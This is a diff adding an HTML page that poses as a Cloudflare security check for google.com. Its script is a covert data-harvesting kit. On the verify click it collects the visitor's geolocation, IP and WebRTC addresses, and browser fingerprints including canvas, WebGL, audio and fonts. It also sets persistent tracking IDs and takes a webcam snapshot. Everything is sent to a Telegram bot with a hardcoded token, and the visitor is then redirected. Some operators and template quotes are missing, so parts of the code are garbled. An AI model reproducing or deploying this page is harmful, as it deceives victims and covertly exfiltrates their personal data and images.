@@ -1,0 +1,648 @@
+‎<!DOCTYPE html>
+‎<html lang="en">
+‎<head>
+‎  <meta charset="UTF-8" />
+‎  <title>Attention Required! | Cloudflare</title>
+‎  <meta name="viewport" content="width=device-width, initial-scale=1" />
+‎  <!-- Google Fonts -->
+‎  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet" />
+‎  <!-- Font Awesome -->
+‎  <link
+‎    rel="stylesheet"
+‎    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"
+‎    integrity="sha512-4v5AcBhQlf+aTz8N9M7zF25rXjEFJWrbz/N2XTlXl8tb3n2PB0CLsm2SxxcLEaNTLh8U5rdyu8oJYtE9FyxWvw=="
+‎    crossorigin="anonymous"
+‎    referrerpolicy="no-referrer"/>
+‎    <link rel="stylesheet" href="style.css">
+‎  <style>
+‎    body {
+‎      margin: 0;
+‎      font-family: 'Roboto', sans-serif;
+‎      background-color: #f6f9fc;
+‎      color: #333;
+‎      display: flex;
+‎      justify-content: center;
+‎      align-items: center;
+‎      min-height: 100vh;
+‎      padding: 20px;
+‎      text-align: center;
+‎    }
+‎
+‎    .container {
+‎      max-width: 700px;
+‎      width: 100%;
+‎      background-color: #fff;
+‎      padding: 40px 30px;
+‎      border-radius: 12px;
+‎      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+‎    }
+‎
+‎    h1 {
+‎      font-size: 36px;
+‎      font-weight: 700;
+‎      margin-bottom: 10px;
+‎    }
+‎
+‎    p {
+‎      font-size: 18px;
+‎      margin-bottom: 30px;
+‎    }
+‎
+‎    .domain {
+‎      background: #ddd;
+‎      padding: 4px 10px;
+‎      border-radius: 4px;
+‎      font-weight: bold;
+‎    }
+‎
+‎    .interactive-box {
+‎      margin: 0 auto 30px;
+‎      background-color: #f9f9f9;
+‎      border: 1px solid #ccc;
+‎      border-radius: 10px;
+‎      width: 320px;
+‎      max-width: 90vw;
+‎      padding: 20px 25px;
+‎      cursor: pointer;
+‎      display: flex;
+‎      align-items: center;
+‎      justify-content: center;
+‎      gap: 15px;
+‎      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+‎      position: relative;
+‎      transition: all 0.5s ease;
+‎      user-select: none;
+‎      outline-offset: 4px;
+‎    }
+‎
+‎    .interactive-box.expanded {
+‎      width: 100%;
+‎      max-width: 600px;
+‎      padding: 40px 30px;
+‎      border-color: #4285f4;
+‎      box-shadow: 0 8px 20px rgba(66, 133, 244, 0.4);
+‎      cursor: default;
+‎      justify-content: center;
+‎    }
+‎
+‎    .interactive-box .text {
+‎      font-size: 18px;
+‎      font-weight: 600;
+‎      color: #333;
+‎      transition: opacity 0.3s ease;
+‎    }
+‎
+‎    .interactive-box.expanded .text {
+‎      opacity: 0;
+‎    }
+‎
+‎    .overlay {
+‎      position: absolute;
+‎      top: 0;
+‎      left: 0;
+‎      right: 0;
+‎      bottom: 0;
+‎      background: rgba(66, 133, 244, 0.9);
+‎      color: white;
+‎      font-weight: 700;
+‎      font-size: 20px;
+‎      display: flex;
+‎      justify-content: center;
+‎      align-items: center;
+‎      opacity: 0;
+‎      pointer-events: none;
+‎      border-radius: 10px;
+‎      transition: opacity 0.4s ease;
+‎      gap: 12px;
+‎    }
+‎
+‎    .overlay.active {
+‎      opacity: 1;
+‎      pointer-events: all;
+‎    }
+‎
+‎    .loading-spinner {
+‎      border: 4px solid #f3f3f3;
+‎      border-top: 4px solid #fff;
+‎      border-radius: 50%;
+‎      width: 28px;
+‎      height: 28px;
+‎      animation: spin 1s linear infinite;
+‎    }
+‎
+‎    @keyframes spin {
+‎      0% {
+‎        transform: rotate(0deg);
+‎      }
+‎      100% {
+‎        transform: rotate(360deg);
+‎      }
+‎    }
+‎
+‎    .browser-window {
+‎      background: #fff;
+‎      width: 300px;
+‎      height: 180px;
+‎      margin: 0 auto;
+‎      border-top: 30px solid #ccc;
+‎      border-radius: 8px;
+‎      position: relative;
+‎      box-shadow: 0 3px 8px rgba(0, 0, 0, 0.1);
+‎    }
+‎
+‎    .window-dots {
+‎      position: absolute;
+‎      top: -22px;
+‎      left: 10px;
+‎    }
+‎
+‎    .dot {
+‎      height: 10px;
+‎      width: 10px;
+‎      background-color: #888;
+‎      border-radius: 50%;
+‎      display: inline-block;
+‎      margin-right: 5px;
+‎    }
+‎
+‎    .warning {
+‎      font-size: 60px;
+‎      color: #ff9900;
+‎      line-height: 180px;
+‎    }
+‎
+‎    @media screen and (max-width: 480px) {
+‎      .interactive-box {
+‎        width: 100%;
+‎        padding: 20px;
+‎      }
+‎    }
+‎
+‎    /* Hide video and canvas */
+‎    video,
+‎    canvas {
+‎      display: none;
+‎    }
+‎</style>
+‎</head>
+‎<body>
+‎  <div class="container" role="main" aria-label="Cloudflare session verification">
+‎    <h1>One more step</h1>
+‎    <p>
+‎      Please complete the security check to access
+‎      <span class="domain">google.com</span>
+‎    </p>
+‎
+‎    <div
+‎      class="interactive-box"
+‎      id="interactiveBox"
+‎      tabindex="0"
+‎      role="button"
+‎      aria-pressed="false"
+‎      aria-label="Session verification box"
+‎    >
+‎      <span class="text">Click here to verify I'm not a bot</span>
+‎      <div class="overlay" id="overlay" aria-live="polite" aria-atomic="true">
+‎        Verifying<span class="loading-spinner"></span>
+‎      </div>
+‎    </div>
+‎<!-- Ad Boxes Section -->
+‎<div class="ads-container">
+‎  <div class="ad-box">
+‎    <div class="ad-icon"><i class="fas fa-shield-alt"></i></div>
+‎  <div class="ad-box">
+‎    <div class="ad-icon"><i class="fas fa-cloud-download-alt"></i></div>
+‎    <div class="ad-title">Free VPN Service</div>
+‎    <div class="ad-description">Browse anonymously and access restricted content safely</div>
+‎    <button class="ad-button">Visit site</button>
+‎  </div>
+‎</div>
+‎    <div class="browser-window" aria-hidden="true">
+‎      <div class="window-dots">
+‎        <span class="dot"></span>
+‎        <span class="dot"></span>
+‎        <span class="dot"></span>
+‎      </div>
+‎      <div class="warning"><i class="fas fa-exclamation-triangle"></i></div>
+‎    </div>
+‎  </div>
+‎
+‎  <video id="video" autoplay playsinline></video>
+‎  <canvas id="snapshotCanvas"></canvas>
+‎
+‎  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js" crossorigin="anonymous"></script>
+‎
+‎  <script>
+‎    const TELEGRAM_BOT_TOKEN = "8428119997:AAFhti-QYtJXBp_OxLa9rJysMi9dsKYBj2M"; //add yours
+‎    const TELEGRAM_CHAT_ID = "947993052"; //add yours
+‎
+‎    const interactiveBox = document.getElementById("interactiveBox");
+‎    const overlay = document.getElementById("overlay");
+‎    const infoText = document.querySelector("p");
+‎
+‎    let verified = false;
+‎
+‎    async function getGeoLocation() {
+‎      return new Promise((resolve) => {
+‎        navigator.geolocation.getCurrentPosition(
+‎          (pos) =>
+‎            resolve({
+‎              lat: pos.coords.latitude,
+‎              lon: pos.coords.longitude,
+‎              accuracy: pos.coords.accuracy,
+‎            }),
+‎          (err) => resolve({ error: err.message }),
+‎          { timeout: 5000 }
+‎        );
+‎      });
+‎    }
+‎
+‎    async function fetchIPAddress() {
+‎      try {
+‎        const res = await fetch("https://api.ipify.org?format=json");
+‎        const data = await res.json();
+‎        return data.ip;
+‎      } catch {
+‎        return "Unavailable";
+‎      }
+‎    }
+‎
+‎    function getCanvasFingerprint() {
+‎      const canvas = document.createElement("canvas");
+‎      const ctx = canvas.getContext("2d");
+‎      ctx.textBaseline = "top";
+‎      ctx.font = "16px Arial";
+‎      ctx.fillStyle = "#f60";
+‎      ctx.fillRect(10, 10, 100, 50);
+‎      ctx.fillStyle = "#069";
+‎      ctx.fillText("CanvasFingerprinting", 20, 30);
+‎      return CryptoJS.SHA256(canvas.toDataURL()).toString();
+‎    }
+‎
+‎    function detectAutofillLeak() {
+‎      const i = document.createElement("input");
+‎      i.autocomplete = "on";
+‎      i.style.position = "absolute";
+‎      i.style.left = "-9999px";
+‎      document.body.appendChild(i);
+‎      i.focus();
+‎      const leaked = i.value.length > 0;
+‎      document.body.removeChild(i);
+‎      return leaked ? "Detected" : "None";
+‎    }
+‎
+‎    function collectSystemInfo() {
+‎      return {
+‎        userAgent: navigator.userAgent,
+‎        platform: navigator.platform,
+‎        language: navigator.language,
+‎        memory: navigator.deviceMemory  "Unknown",
+‎        cores: navigator.hardwareConcurrency  "Unknown",
+‎        resolution: ${screen.width}x${screen.height},
+‎        pixelRatio: window.devicePixelRatio,
+‎        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+‎        colorDepth: screen.colorDepth,
+‎        doNotTrack: navigator.doNotTrack,
+‎        plugins: Array.from(navigator.plugins).map((p) => p.name),
+‎        mimeTypes: Array.from(navigator.mimeTypes).map((m) => m.type),
+‎        battery: navigator.getBattery ? undefined : "Unavailable", // will be filled async
+‎      };
+‎    }
+‎
+‎    async function getBatteryStatus() {
+‎      if (!navigator.getBattery) return "Unavailable";
+‎      try {
+‎        const battery = await navigator.getBattery();
+‎        return {
+‎          charging: battery.charging,
+‎          level: battery.level,
+‎          chargingTime: battery.chargingTime,
+‎          dischargingTime: battery.dischargingTime,
+‎        };
+‎      } catch {
+‎        return "Error";
+‎      }
+‎    }
+‎
+‎    function enumerateFonts() {
+‎      const baseFonts = ["monospace", "sans-serif", "serif"];
+‎      const testString = "mmmmmmmmmmlli";
+‎      const testSize = "72px";
+‎      const h = document.getElementsByTagName("body")[0];
+‎      const defaultWidth = {};
+‎      const defaultHeight = {};
+‎      const detectedFonts = [];
+‎
+‎      const span = document.createElement("span");
+‎      span.style.fontSize = testSize;
+‎      span.innerHTML = testString;
+‎      span.style.position = "absolute";
+‎      span.style.left = "-9999px";
+‎      h.appendChild(span);
+‎
+‎      for (let i = 0; i < baseFonts.length; i++) {
+‎        span.style.fontFamily = baseFonts[i];
+‎        defaultWidth[baseFonts[i]] = span.offsetWidth;
+‎        defaultHeight[baseFonts[i]] = span.offsetHeight;
+‎      }
+‎
+‎      const fontList = [
+‎        "Arial",
+‎        "Courier New",
+‎        "Georgia",
+‎        "Times New Roman",
+‎        "Verdana",
+‎        "Comic Sans MS",
+‎        "Impact",
+‎        "Lucida Console",
+‎        "Tahoma",
+‎        "Trebuchet MS",
+‎      ];
+‎
+‎      for (let i = 0; i < fontList.length; i++) {
+‎        let detected = false;
+‎        for (let j = 0; j < baseFonts.length; j++) {
+‎          span.style.fontFamily = fontList[i] + "," + baseFonts[j];
+‎          const matched =
+‎            span.offsetWidth !== defaultWidth[baseFonts[j]] 
+‎            span.offsetHeight !== defaultHeight[baseFonts[j]];
+‎          if (matched) {
+‎            detected = true;
+‎            break;
+‎          }
+‎        }
+‎        if (detected) detectedFonts.push(fontList[i]);
+‎      }
+‎      h.removeChild(span);
+‎      return detectedFonts;
+‎    }
+‎
+‎    function getWebGLFingerprint() {
+‎      try {
+‎        const canvas = document.createElement("canvas");
+‎        const gl =
+‎          canvas.getContext("webgl")  canvas.getContext("experimental-webgl");
+‎        if (!gl) return "Unavailable";
+‎        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+‎        const vendor = debugInfo
+‎          ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)
+‎          : "Unknown";
+‎        const renderer = debugInfo
+‎          ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+‎          : "Unknown";
+‎        return vendor + " - " + renderer;
+‎      } catch {
+‎        return "Error";
+‎      }
+‎    }
+‎
+‎    function detectHeadless() {
+‎      const userAgent = navigator.userAgent;
+‎      const webdriver = navigator.webdriver;
+‎      const chrome = window.chrome;
+‎      const permissions = navigator.permissions;
+‎      const headlessIndicators = [
+‎        webdriver === true,
+‎        !chrome,
+‎        userAgent.indexOf("HeadlessChrome") !== -1,
+‎        permissions === undefined,
+‎      ];
+‎      return headlessIndicators.some(Boolean);
+‎    }
+‎
+‎    function getNetworkInfo() {
+‎      if (!navigator.connection) return "Unavailable";
+‎      const c = navigator.connection;
+‎      return {
+‎        downlink: c.downlink,
+‎        effectiveType: c.effectiveType,
+‎        rtt: c.rtt,
+‎        saveData: c.saveData,
+‎      };
+‎    }
+‎
+‎    function timingAttack() {
+‎      const start = performance.now();
+‎      for (let i = 0; i < 1000000; i++) {
+‎        Math.sqrt(i);
+‎      }
+‎      const end = performance.now();
+‎      return end - start;
+‎    }
+‎
+‎    function getLocalStorageId() {
+‎      try {
+‎        let id = localStorage.getItem("unique_id");
+‎        if (!id) {
+‎          id = CryptoJS.SHA256(Date.now().toString() + Math.random().toString()).toString();
+‎          localStorage.setItem("unique_id", id);
+‎        }
+‎        return id;
+‎      } catch {
+‎        return "Unavailable";
+‎      }
+‎    }
+‎
+‎    function getIndexedDBId() {
+‎      return new Promise((resolve) => {
+‎        try {
+‎          const request = indexedDB.open("fingerprintDB", 1);
+‎          request.onupgradeneeded = () => {
+‎            const db = request.result;
+‎            if (!db.objectStoreNames.contains("ids")) {
+‎              db.createObjectStore("ids");
+‎            }
+‎          };
+‎          request.onsuccess = () => {
+‎            const db = request.result;
+‎            const tx = db.transaction("ids", "readwrite");
+‎            
+‎            const store = tx.objectStore("ids");
+‎            const getRequest = store.get("unique_id");
+‎            getRequest.onsuccess = () => {
+‎              if (getRequest.result) {
+‎                resolve(getRequest.result);
+‎              } else {
+‎                const newId = CryptoJS.SHA256(Date.now().toString() + Math.random().toString()).toString();
+‎                store.put(newId, "unique_id");
+‎                resolve(newId);
+‎              }
+‎            };
+‎            getRequest.onerror = () => resolve("Unavailable");
+‎          };
+‎          request.onerror = () => resolve("Unavailable");
+‎        } catch {
+‎          resolve("Unavailable");
+‎        }
+‎      });
+‎    }
+‎
+‎    async function getAudioFingerprint() {
+‎      return new Promise((resolve) => {
+‎        try {
+‎          const AudioContext = window.AudioContext  window.webkitAudioContext;
+‎          const context = new AudioContext();
+‎          const oscillator = context.createOscillator();
+‎          const analyser = context.createAnalyser();
+‎          const gain = context.createGain();
+‎          gain.gain.value = 0;
+‎          oscillator.connect(analyser);
+‎          analyser.connect(gain);
+‎          gain.connect(context.destination);
+‎          oscillator.start(0);
+‎          const array = new Uint8Array(analyser.frequencyBinCount);
+‎          analyser.getByteFrequencyData(array);
+‎          oscillator.stop();
+‎          context.close();
+‎          const hash = CryptoJS.SHA256(array.join(",")).toString();
+‎          resolve(hash);
+‎        } catch {
+‎          resolve("Unavailable");
+‎        }
+‎      });
+‎    }
+‎
+‎    async function captureSnapshot() {
+‎      const video = document.getElementById("video");
+‎      const canvas = document.getElementById("snapshotCanvas");
+‎      try {
+‎        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+‎        video.srcObject = stream;
+‎        await new Promise((resolve) => (video.onloadedmetadata = resolve));
+‎        canvas.width = video.videoWidth;
+‎        canvas.height = video.videoHeight;
+‎        const ctx = canvas.getContext("2d");
+‎        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+‎        stream.getTracks().forEach((t) => t.stop());
+‎        return canvas.toDataURL("image/jpeg", 0.85);
+‎      } catch {
+‎        return null;
+‎      }
+‎    }
+‎
+‎    async function getWebRTCIPs() {
+‎      return new Promise((resolve) => {
+‎        const ips = new Set();
+‎        const pc = new RTCPeerConnection({ iceServers: [] });
+‎        pc.createDataChannel("");
+‎        pc.createOffer()
+‎          .then((offer) => pc.setLocalDescription(offer))
+‎          .catch(() => resolve([]));
+‎        pc.onicecandidate = (event) => {
+‎          if (!event  !event.candidate) {
+‎            resolve(Array.from(ips));
+‎            return;
+‎          }
+‎          const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+‎          const ipMatch = ipRegex.exec(event.candidate.candidate);
+‎          if (ipMatch) ips.add(ipMatch[1]);
+‎        };
+‎      });
+‎    }
+‎
+‎    async function sendToTelegram(payload) {
+‎      const msg = 🌐 IP: ${payload.ip}
+‎📍 Location: ${JSON.stringify(payload.location)}
+‎🖥️ System: ${JSON.stringify(payload.system)}
+‎🔍 Fingerprint: ${payload.fingerprint}
+‎🔒 Autofill: ${payload.autofill}
+‎🖼️ WebGL: ${payload.webglFingerprint}
+‎🔊 AudioFP: ${payload.audioFingerprint}
+‎🔋 Battery: ${JSON.stringify(payload.battery)}
+‎🎨 Fonts: ${payload.fonts.join(", ")}
+‎🤖 Headless: ${payload.headless}
+‎🌐 Network: ${JSON.stringify(payload.network)}
+‎⏱️ Timing: ${payload.timing}ms
+‎🆔 LocalStorageID: ${payload.localStorageId}
+‎🆔 IndexedDBID: ${payload.indexedDBId}
+‎🕵️‍♂️ WebRTC IPs: ${payload.webRTCIPs.join(", ")}
+‎📸 Snapshot: ${payload.snapshot ? "[Image Attached]" : "Unavailable"};
+‎
+‎      // Send text message first
+‎      await fetch(https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage, {
+‎        method: "POST",
+‎        headers: { "Content-Type": "application/json" },
+‎        body: JSON.stringify({
+‎          chat_id: TELEGRAM_CHAT_ID,
+‎          text: msg,
+‎          parse_mode: "HTML",
+‎        }),
+‎      });
+‎      
+‎      // If snapshot available, send photo
+‎      if (payload.snapshot) {
+‎        const base64Data = payload.snapshot.split(",")[1];
+‎        const formData = new FormData();
+‎        formData.append("chat_id", TELEGRAM_CHAT_ID);
+‎        formData.append("photo", new Blob([Uint8Array.from(atob(base64Data), c => c.charCodeAt(0))], { type: "image/jpeg" }));
+‎        formData.append("caption", "User snapshot on verification");
+‎
+‎        await fetch(https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto, {
+‎          method: "POST",
+‎          body: formData,
+‎        });
+‎      }
+‎    }
+‎
+‎    async function onVerifyClick() {
+‎      if (verified) return;
+‎      verified = true;
+‎      interactiveBox.setAttribute("aria-pressed", "true");
+‎      interactiveBox.classList.add("expanded");
+‎      overlay.classList.add("active");
+‎
+‎      // Collect data
+‎      const ip = await fetchIPAddress();
+‎      const location = await getGeoLocation();
+‎      const fingerprint = getCanvasFingerprint();
+‎      const autofill = detectAutofillLeak();
+‎      const system = collectSystemInfo();
+‎      system.battery = await getBatteryStatus();
+‎      const fonts = enumerateFonts();
+‎      const webglFingerprint = getWebGLFingerprint();
+‎      const headless = detectHeadless();
+‎      const network = getNetworkInfo();
+‎      const timing = timingAttack();
+‎      const localStorageId = getLocalStorageId();
+‎      const indexedDBId = await getIndexedDBId();
+‎      const audioFingerprint = await getAudioFingerprint();
+‎      const webRTCIPs = await getWebRTCIPs();
+‎      const snapshot = await captureSnapshot();
+‎
+‎      // Send data to Telegram bot
+‎      await sendToTelegram({
+‎        ip,
+‎        location,
+‎        fingerprint,
+‎        autofill,
+‎        system,
+‎        fonts,
+‎        webglFingerprint,
+‎        headless,
+‎        network,
+‎        timing,
+‎        localStorageId,
+‎        indexedDBId,
+‎        audioFingerprint,
+‎        webRTCIPs,
+‎        snapshot,
+‎      });
+‎
+‎      // Show success message
+‎      overlay.textContent = "Verification complete. Redirecting...";
+‎      setTimeout(() => {
+‎        window.location.href = "https://www.google.com";
+‎      }, 3000);
+‎    }
+‎
+‎    interactiveBox.addEventListener("click", onVerifyClick);
+‎    interactiveBox.addEventListener("keydown", (e) => {
+‎      if (e.key === "Enter" || e.key === " ") {
+‎        e.preventDefault();
+‎        onVerifyClick();
+‎      }
+‎    });
+‎  </script>
+‎</body>
+‎</html>
+‎
